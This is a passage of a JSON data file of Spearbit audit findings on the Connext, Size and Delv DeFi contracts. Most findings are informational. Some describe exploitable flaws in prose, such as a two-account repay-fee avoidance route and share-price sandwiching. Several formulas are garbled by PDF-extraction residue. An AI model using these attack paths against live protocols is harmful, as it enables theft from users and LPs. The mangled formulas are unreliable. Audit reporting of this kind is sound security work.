        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document about two MerkleTreeManager's",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "On the hub domain (e.g. mainnet) there are two MerkleTreeManagers, one for the hub and one for the MainnetSpokeConnector. This might not be obvious to the casual readers of the code. Accidentally confusing the two would lead to weird issues.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Match filename to contract name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Sometimes the name of the .sol file is different than the contract name. Also sometimes multiple contracts are defined in the same file. Additionally there are multiple .sol files with the same name. This makes it more difficult to find the file containing the contract. File: messaging/Merkle.sol contract MerkleTreeManager is ProposedOwnableUpgradeable { ... } File: messaging/libraries/Merkle.sol library MerkleLib { ... } File: ProposedOwnable.sol abstract contract ProposedOwnable is IProposedOwnable { ... } abstract contract ProposedOwnableUpgradeable is Initializable, ProposedOwnable { ... } File: OZERC20.sol 148 contract ERC20 is IERC20, IERC20Permit, EIP712 { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use uint40 for type in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All internal functions in TypedMemView use uint40 for type except build(). Since internal functions can be called by inheriting contracts, it's better to provide a consistent interface.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment in function typeOf() is inaccurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A comment in function typeOf() is inaccurate. It says it is shifting 24 bytes, however it is shifting 216 / 8 = 27 bytes. function typeOf(bytes29 memView) internal pure returns (uint40 _type) { assembly { ... // 216 == 256 - 40 _type := shr(216, memView) // shift out lower 24 bytes } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec documentation in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "unsafeJoin()'s Natspec documentation is incomplete as the second argument to function is not documented.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove irrelevant comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": " Instance 1 - TypedMemView.sol#L770 clone() has this comment that seems to be copied from equal(). This is not applicable to clone() and can be deleted. * @dev Shortcuts if the pointers are identical, otherwise compares type and digest.  Instance 2 - SpokeConnector.sol#L499 The function process of SpokeConnector contains comments that are no longer relevant. // check re-entrancy guard // require(entered == 1, \"!reentrant\"); // entered = 0; Instance 3 - BridgeFacet.sol#L419 Nomad is no longer used within Connext. However, they are still being mentioned in the comments within the codebase. * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using ,! the nomad * network.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about TypedMemView encoding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A TypedMemView variable of type bytes29 is encoded as follows:  First 5 bytes encode a type flag.  Next 12 bytes point to a memory address.  Next 12 bytes encode the length of the memory view (in bytes).  Next 3 bytes are empty. When shifting a TypedMemView variable to the right by 15 bytes (120 bits), the encoded length and the empty bytes are removed. Hence, this comment is incorrect: // 120 bits = 12 bytes (the encoded loc) + 3 bytes (empty low space) _loc := and(shr(120, memView), _mask)",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Constants can be used in assembly blocks directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. Highlighted code above have the following pattern: uint256 _mask = LOW_12_MASK; // assembly can't use globals assembly { // solium-disable-previous-line no-inline-assembly _len := and(shr(24, memView), _mask) } Here, LOW_12_MASK is a constant which can be used directly in assembly code.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document source of processMessageFromRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function processMessageFromRoot() of ArbitrumHubConnector doesn't contain a comment where it is derived from. Most other functions have a link to the source. Linking to the source would make the function easier to verify and maintain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Be aware of zombies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _validateSendRoot() of ArbitrumHubConnector check that stakerCount and child- StakerCount are larger than 0. The definition of stakerCount and childStakerCount document that they could include zombies. Its not immediately clear what zombies are, but it might be relevant to consider them. contract ArbitrumHubConnector is HubConnector { function _validateSendRoot(...) ... { ... require(node.stakerCount > 0 && node.childStakerCount > 0, \"!staked\"); } } // Number of stakers staked on this node. This includes real stakers and zombies uint64 stakerCount; // Number of stakers staked on a child node. This includes real stakers and zombies uint64 childStakerCount;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Readability of proveAndProcess()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function proveAndProcess() is relatively difficult to understand because it first processes for the case of i==0 and then does a loop over i==1..._proofs.length. function proveAndProcess(...) ... { ... bytes32 _messageHash = keccak256(_proofs[0].message); bytes32 _messageRoot = calculateMessageRoot(_messageHash, _proofs[0].path, _proofs[0].index); proveMessageRoot(_messageRoot, _aggregateRoot, _aggregatePath, _aggregateIndex); messages[_messageHash] = MessageStatus.Proven; for (uint32 i = 1; i < _proofs.length; ) { _messageHash = keccak256(_proofs[i].message); bytes32 _calculatedRoot = calculateMessageRoot(_messageHash, _proofs[i].path, _proofs[i].index); require(_calculatedRoot == _messageRoot, \"!sharedRoot\"); messages[_messageHash] = MessageStatus.Proven; unchecked { ++i; } } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Readability of checker()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function checker() is relatively difficult to read due to the else if chaining of if statements. As the if statements call return(), the else isn't necessary and the code can be made more readable. function checker() external view override returns (bool canExec, bytes memory execPayload) { bytes32 outboundRoot = CONNECTOR.outboundRoot(); if ((lastExecuted + EXECUTION_INTERVAL) > block.timestamp) { return (false, bytes(\"EXECUTION_INTERVAL seconds are not passed yet\")); } else if (lastRootSent == outboundRoot) { return (false, bytes(\"Sent root is the same as the current root\")); } else { execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); return (true, execPayload); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use function addressToBytes32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function dispatch() of SpokeConnector contains an explicit conversion from address to bytes32. There is also a function addressToBytes32() that does the same and is more readable. function dispatch(...) ... { bytes memory _message = Message.formatMessage( ... bytes32(uint256(uint160(msg.sender))), ... );",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Paying repayFee can be avoided by any borrower via BorrowerExit or BorrowAsMarketOrder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "A borrower can remove their repayFee, rendering it to a dust amount, with the help of two accounts by: 1. BorrowerExit The borrower (Alice.1) right after new borrowing was made can substitute full repayFee with earlyBorrowerExitFee by atomically setting up another collateralized account Alice.2 and running Alice.2.BorrowAsLimitOrder(huge APR) -> Alice.1.BorrowerExit(to Alice.2) -> issuanceValue can be Alice.2.BorrowAsLimitOrder(null) -> Alice.1.Withdraw(all). manipulated to become dust on borrower exiting to an own account, which renders repayFee meaningless. Also, Alice.2 collateral requirements will be lower compared to the initial debt position since repayFee part will be close to zero. I.e. 2. BorrowAsMarketOrder  Bob.1 is a lender posted some dust collateral (say 10 USDC valued), creates a lender offer with a significant APR  Bob.2 borrows from Bob.1 with their target faceValue and dueDate (e.g., faceValue = 1e6 USDC maturing in 1 year), while issuanceValue and repayFee are close to zero due to APR based calculation  Bob.1 borrows from market for given faceValue and dueDate using Bob.2 debt linked credit position as receivables  This way Bob go _borrowGeneratingDebt() route interacting with their own account, and then _borrowFrom- Credit() route interacting with the market lending offer  At dueDate account Bob.2 fully repays faceValue  Bob effectively borrowed faceValue due at dueDate paying no material fees to the protocol  The collateral requirements will be similarly lighter due to repayFee part removal Both paths provide an attacking borrower with the intended debt position that has no repayFee component. There are no material prerequisites, it can be routinely done by any borrower instead of taking from the market directly. Likelihood: High (no low probability preconditions) + Impact: High (repay fee is the major revenue source for the protocol) = Severity: Critical.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Reverse market is not supported due to improper escalations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The current development of Size protocol is designed to operate with USDC as borrow token and WETH as collateral. Size team also intends to deploy a reverse market version of the protocol with WETH as borrow token and USDC as collateral. However the current implementation does not support the reverse market. The lack of deployment configuration values for this version introduces different potential issues based on how this values are escalated. The main identified function prone to fail is debtTokenAmountToCollateralTokenAmount. This function escalated the debtTokenAmount to Wad, so 18 decimals. Then multiplies it by 1e18 and divides it by the price returned by the price feed, escalated to 18 decimals. However on a reverse market, this value would be as well returned escalated to 18 decimals but representing a USDC amount. Effectively breaking any further calculation or transfer based on this returned amount. Also, if certain configuration values are not escalated differently other functions can be affected. For example, if crOpening is not changed to 6 decimals on reverse market, the function collateralRatio may return values escalated to 6 decimals and thus reverting when validating if a user is below the limit borrow collateral ration. Moreover if the crLiquidation is not escalated as well, the function isUserUnderwater may compare 6 decimal values with 18 decimal values.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Early self liquidations receive a portion of future fees to be paid by other creditors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "Self liquidations are permitted when a creditor is at loss. Put simply, this means when the total debt of a position exceeds it's share of collateral then creditors may self liquidate to realize the loss instead of being further exposed to the borrower. The flow of self liquidation looks like the following:  Liquidation eligibility is checked on the debt position.  Repay fees are paid pro-rata by the borrower in proportion to the creditor's contribution of debtPosition.faceValue.  assignedCollateral is calculated based off of creditPosition in a pro-rata fashion. assignedCollateral utilizes the debt position's total collateral and does not consider fees that other creditors will pay when they perform their respective liquidations. In effect, the first creditor has a percentage claim on all collateral which includes unpaid fees.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Validation of APR in BuyMarketCredit leads to underestimation of borrower requirements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The implementation of the BuyMarketCredit checks if the APR exceeds maxAPR to decide whether to proceed with a lending operation. However, the intention, as deduced from the business logic, seems to focus on ensuring that the APR should not fall below a certain threshold, which is beneficial for the lender in terms of returns. The current implementation may lead to transactions that do not satisfy the lender's intended minimum yield.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Self liquidations are profitable under certain collateralization ratios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The specific eligibility for a self-liquidation as per the spec is when debtInCollateralToken exceeds the total collateral allocated to the credit position. Assuming there is only one lender, it seems possible that a cred- itor could self-liquidate and profit from liquidation because debtInCollateralToken considers the debt position's total debt and not just debtPosition.faceValue. 6 function validateSelfLiquidate(State storage state, SelfLiquidateParams calldata params) external view { CreditPosition storage creditPosition = state.getCreditPosition(params.creditPositionId); DebtPosition storage debtPosition = state.getDebtPositionByCreditPositionId(params.creditPositionId); uint256 assignedCollateral = state.getCreditPositionProRataAssignedCollateral(creditPosition); uint256 debtInCollateralToken = state.debtTokenAmountToCollateralTokenAmount(debtPosition.getTotalDebt()); ,! ,! // validate creditPositionId if (!state.isCreditPositionSelfLiquidatable(params.creditPositionId)) { revert Errors.LOAN_NOT_SELF_LIQUIDATABLE( params.creditPositionId, state.collateralRatio(debtPosition.borrower), state.getLoanStatus(params.creditPositionId) ); } if (!(assignedCollateral < debtInCollateralToken)) { revert Errors.LIQUIDATION_NOT_AT_LOSS(params.creditPositionId, assignedCollateral, ,! debtInCollateralToken); } // validate msg.sender if (msg.sender != creditPosition.lender) { revert Errors.LIQUIDATOR_IS_NOT_LENDER(msg.sender, creditPosition.lender); } } In practice, self-liquidations are profitable for creditors when total debt is within the range of (assuming there is only a single creditor): state.debtTokenAmountToCollateralTokenAmount(creditPosition.credit) < assignedCollateral < ,! debtInCollateralToken Creditors profit on the collateral that is required to back the debt position's repayFee and overdueLiquidatorRe- ward. The total profit for creditors is strictly limited to: 0 < liquidationProfit < state.debtTokenAmountToCollateralTokenAmount(debtPosition.repayFee + ,! debtPosition.overdueLiquidatorReward) Consider updating the parameter",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LiquidateWithReplacement might not be available for the big enough debt positions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "liquidatorProfitBorrowAsset can be substantial for the biggest debt positions, but it is assumed that there exists one position both that the corresponding big enough params.borrower always be found, i.e. having an eligible offer and enough free collateral to cover the whole debt position being liquidated at once:  Size.sol#L228-L238 function liquidateWithReplacement(LiquidateWithReplacementParams calldata params) // ... { state.validateLiquidateWithReplacement(params); (liquidatorProfitCollateralAsset, liquidatorProfitBorrowAsset) = ,! state.executeLiquidateWithReplacement(params); state.validateUserIsNotBelowOpeningLimitBorrowCR(params.borrower); // << This might not be the case for prolonged periods of time, while creating such position in a flash loan manner is not possible (since the new debt position has to stay), so a usual Liquidate -> Withdraw might be eventually performed instead, which is compatible with flash borrowing of the face value and selling the collateral proceeds with repaying the loan atomically, i.e. there are no additional position existence requirements there. This way protocol will deprive itself from liquidatorProfitBorrowAsset in some cases when it's the biggest.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unexpected fee deduction on self-liquidations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The selfLiquidate function is designed to allow lenders to liquidate their positions without external liquidator involvement, improving protocol health by ensuring timely collateral recovery without profitability for the liquidator. According to the technical documentation 3.5.3.2 Self Liquidation, no fees should be charged during this process. However, the current implementation incorrectly charges a repay fee before computing the collateral to be assigned to the lender, thereby reducing the collateral amount available contrary to the documentation.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Maximum capital checks may prevent deposits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The deposit functions performs two validation checks after depositing either the collateral or borrow token. These two validations attempt to ensure that the maximum amounts defined by the Size team of each token on the protocol are not exceeded. The functions that perform the checks are:  validateCollateralTokenCap  validateBorrowATokenCap The maximum amounts are initially designed to avoid an excessive amount of funds entering the protocol. Never- theless there are certain scenarios where these checks may arise functional problems. The exposed scenario for illustrating this issue starts with a user attempting to deposit ETH as collateral. But the amount of borrow token, calculated as the total balance of aToken from funds deposited on Aave has increased over the maximum amount, the transaction reverts. This can also have a higher impact when depositing collateral to avoid liquidation, as identified by Size team.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Market order borrows may revert due to missing edge case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "When a borrower attempts to execute a market order against a specific lender, the borrower can opt to borrow from their existing credit positions that will expire before the due date of the new debt position being created. This maintains the availability of credit redemption when each debt position expires. Credit is transferred from msg.sender to params.lender who effectively buys the borrower's credit. To ensure the correct leftover amount is used to generate debt, _borrowFromCredit() will skip credit positions with deltaAmountIn < state.riskConfig.minimumCreditBorrowAToken. However, this fails to consider when the last credit position pushes exitCreditPositionId below state.riskConfig.minimumCreditBorrowAToken. Meaning the borrower will be unable to fully execute their borrow market order as it will revert before being able to generate the rest of amountOutLeft as debt. This revert happens explicitly within the AccountingLibrary.createCreditPosition() function.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "faceValue precision can be lowered by additional mulDivDown in LendAsMarketOrder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "When !params.exactAmountIn the mulDivDown operation is done twice in LendAsMarketOrder, introducing additional rounding errors to the faceValue value.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Avoid forceApprove for self transfers on ETH deposits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The current implementation calls the forceApprove function from the WETH contract to perform a transferFrom to address(this). This two function calls are not required and can be gas optimised.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Early self liquidation profitability is dependent on the time value of creditor's positions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "Self liquidations are mostly a last resort to allow creditors to reclaim their credit and realize a loss immediately instead of waiting for the protocol to perform a standard liquidation at a loss to make them whole. However, there are some considerations to make in regards to the time value of money. Debt position's must be sufficiently collateralized to avoid all forms of liquidations, although the risk assessment is made on minted debt which includes debtPosition.faceValue. To note, debtPosition.faceValue includes future interest that must be paid by the borrower to the loan's creditors. Effectively, self-liquidations may become profitable for creditors because even though debtInCollateralToken > assignedCollateral is at a loss in nominal terms, the amount of collateral claimed exceeds the current value of their credit according to the specified yield curve.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent naming of non-transferrable borrow token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "Upon initializing a pool, two non-transferrable tokens are deployed. One for the borrow token and another for the collateral token. The naming of the collateral token concatenates the name and symbol of the underlying token to the non-transferrable token. However, this is not done for the borrow token.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Price feed should take the max of the two oracles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "Some considerations to make in regards to how the price feed currently functions. The decimals value is configured within the constructor of PriceFeed.sol and effectively defines the decimals of the price re- turned by PriceFeed.getPrice(). To make things simpler in design, decimals could be defined as a constant of 18 such that getPrice() consistently returns a price that minimizes rounding and is compatible with the current implementation of the Size Lending codebase.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable rate hook calculations revert when the result is negative, while have to be floored at zero per protocol documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "Resulting interest rates in user defined offers can be negative because of the variable rate hooks. Per docs the variable rate hook rate results should be floored at zero. Current implementation reverts when the result is negative. The reverting, i.e. failing when user defined curve can't be met, is a more desired behavior as adding any logic, such as flooring, to user preferences can be not fully expected (it might be the case that it's not even straightforward to fully accommodate such flooring, e.g. it's not a smooth as a function) and can alter user side strategies this way, possibly leading to user losses.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Total debt approach is not aligned with the classic definition of collateralization ratio",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "overdueLiquidatorReward and repayFee should not be a part of collaterization, i.e. they might go with 1 multiplier, but not with CR multiplier. The reason is that both will be taken conditionally in the future, so cannot be treated as a part of the current borrower's debt. This way CR numbers protocol uses do not align with classic definition of CR = Value(Collateral) / Value(Debt), which can cause discrepancies in users' risk assessment processes.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplification of PriceFeed contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The PriceFeed contract calculates prices by taking the ratio of two oracle feeds. However, concerns have been raised about the innecesary complexity of this method, given that in the current version its gonna be working only with ETH/USD and USDC/USD. Furthermore, the precision loss due to the fixed decimal handling in the current implementation could lead to inaccuracies when lower decimals are used as highlighted in the test case PriceFeed.t.sol#L107-L111.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing multicall function, events and errors on ISize Interface",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "The ISize interface currently does not include definitions for events, errors, and the multicall method. These components are essential for comprehensive interface functionality and may impact developers who rely on ISize for building applications on top of Size.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Documentation recommendations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Size-Spearbit-Security-Review.pdf",
        "body": "There are some points in the protocol documentation that look enhanceable.",
        "labels": [
            "Spearbit",
            "Size",
            "Severity: Informational"
        ]
    },
    {
        "title": "Withdrawal shares of msg.sender are burnt incorrectly in _removeLiquidity flow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When _removeLiquidity is called, the _lpShares of AssetId._WITHDRAWAL_SHARE_ASSET_ID is minted for _options.destination. _mint( AssetId._WITHDRAWAL_SHARE_ASSET_ID, _options.destination, // <--- _lpShares ); But after distributing the excess idle in _redeemWithdrawalSharesInternal we burn the clamped amount of with- drawal shares for the msg.sender and not the _options.destination: _burn( AssetId._WITHDRAWAL_SHARE_ASSET_ID, msg.sender, // <--- withdrawalSharesRedeemed ); Note that burning for the msg.sender in _redeemWithdrawalShares makes sense.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Closing netted, non-matured shorts can lead to insolvency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Closing netted shorts can increase the long exposure in case the now non-netted longs are not also closed. This happens when calling closeShort before maturity. As the long exposure increases, a solvency check is required so that all outstanding longs can be fulfilled at maturity. This is not done in closeShort and the protocol can end up insolvent.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Invariants are not checked after calling calculateDistributeExcessIdleShareProceedsNetLongEdge- CaseSafe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "calculateDistributeExcessIdleShareProceedsNetLongEdgeCaseSafe returns: zproceed = zog (cid:0) zog (cid:16)og ( sLP sLP + sW )PV0 (cid:0) zflat zog (cid:0)! 1 (cid:16)og ( sLP sLP + sW )PV0 (cid:0) zflat or in other words: (cid:1)zog 1. This scaling is independent of the number of iterations performed in the Newton approximation loop. This is not really an issue just an observation that one the calculation ones picks this specific value only depending on the original point. 2. After one finds z we still need to check that uint256(_params.netCurveTrade) <= maxBondAmount is false on the updated curve C(z, (cid:16), y ), otherwise the assumption where z + zcurve (cid:0) zmin = ( (cid:16)og zog )z would be wrong which would break: 3. zproceed is not compared to the idle share reserves to make sure it cannot be greater than that value, we need to check: PV0 sLP + sw = PV1 sLP",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "In some cases maxShareReservesDelta can be greater than the idle share reserves in calculateDis- tributeExcessIdle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In calculateDistributeExcessIdle, if the pool is net short and if we end up calculating calcu- lateMaxShareReservesDeltaInitialGuess: (cid:1)zguess = zog yog max(0, yog (cid:0) ((cid:1)ynet + yoptimal )) This initial guess value for the start of the newton method might be bigger than the idle share reserves: and if in calculateMaxShareReservesDelta we only go through the main loop once and break or return early: I < (cid:1)zguess // Proceed with Newton for (uint256 i = 0; i < MAX_SHARE_RESERVES_DELTA_MAX_ITERATIONS; ) { s method for a few iterations.  //... // break or return if (maybeMaxShareReservesDelta > _params.idle) { maybeMaxShareReservesDelta = _params.idle; } } It is not guaranteed that the final returned value is claimed by idle share reserves",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "After trading on the curve in closeShort and applying the fees, spot price is not check to make sure it is still below 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In _calculateCloseShort, one checks the following inequality to make sure the non-matured portion of (cid:1)y which is tr (cid:1)y when given back to the pool does not bear negative interest: (cid:22)(z (cid:0) (cid:16) + (cid:1)zcurve) y (cid:0) tr (cid:1)y ts (cid:20) 1 (cid:0) (cid:30)c(1 (cid:0) pspot ) (cid:20) 1 The far right inequality should be right since we need to have checked that before trading on the curve we were in the region with pspot (cid:20) 1. Thus the negative interest inequality would guarantee that the point (z (cid:0) (cid:16) + (cid:1)z, y (cid:0) tr (cid:1)y ) would also have a spot price of less than 1. But after trading on the curve we add the LP/curve fees minus the governance fee to the share so: (z (cid:0) (cid:16), y ) ! (z (cid:0) (cid:16) + (cid:1)z, y (cid:0) tr (cid:1)y ) ! (z (cid:0) (cid:16) + (cid:1)z + (1 (cid:0) (cid:30)g)fc, y (cid:0) tr (cid:1)y) 8 since the share reserves have increased when adding the pool fees, one does not necessarily know that the spot price at this point is still less than 1: ts (cid:22)(z (cid:0) (cid:16) + (cid:1)zcurve + (1 (cid:0) (cid:30)g)fc) y (cid:0) tr (cid:1)y",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Large vault share price updates can be captured by open/close short",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When opening a short, the user deposits c / c0 * dy - dz * c, when closing in the same transac- tion, they receive base proceeds are also c dz * c as this represents / c0 * dy - dz * c the bond sell and buyback part of the short. This can lead to a profit when a vault share price transaction increasing c is sandwiched. The trader makes a profit and the loss must therefore come from the LPs in equal terms. , where dz * c   ",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Wrong zeta fee adjustments when closing longs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The z and zeta reserves are expected to update to z  and zeta  as follows (when closing longs):   z should reduce by the total trade but include LP fees (gov fees are not reinvested): z  = z - sharePro- ceeds + fees_total - govFees_total.  The effective reserves z   - zeta curve LP fees (fee_c - govFee_c): z Fee_c. should reduce by the curve trade shareProceedsCurve but reinvest the = (z - zeta) - shareProceedsCurve + fee_c - gov- - zeta    To get there, the share adjustments need to be updated by the flat trade and the flat LP fees zeta - (shareProceeds - shareProceedsCurve) + (fee_f - govFee_f).  = zeta Therefore, shareAdjustmentDelta = (shareProceeds - shareProceedsCurve) - (fee_f - govFee_f) but in the code it is shareAdjustmentDelta = (shareProceeds - shareProceedsCurve) - (fee_total - govFee_- total) + fee_c. 10  (dz_c, dy_c, shareProceeds) = HDM.calculateCloseLong(...) dz_c shareProceeds dz = shareProceeds = dz_c - fee_c   = shareProceeds - (fee_c + fee_f) = shareProceeds - fee_total + govFee_total = shareProceeds - fee_total + govFee_total = shareProceeds - (fee_total - govFee_total) dzeta = dz - dz_c = dz - (dz_c - fee_c)  = (shareProceeds - dz_c) - (fee_total - govFee_total) + fee_c it should be (shareProceeds - dz_c) - (fee_f - govFee_f) where (fee_f - govFee_f) can be obtained by (fee_total - govFee_total) - (fee_c - govFee_c)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LPs are paying twice for governance fees when opening longs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The _calculateOpenLong function first computes fees on the bond amount that is paid out to the trader. The governance fee measured in bonds is removed from the bond reserves, then converted to a vault shares amount, and again removed from the share reserves. The governance fees are essentially removed twice, once from the bond and once from the share reserves. Meaning, the LPs are paying twice for it.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "checkpoint can be re-entered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
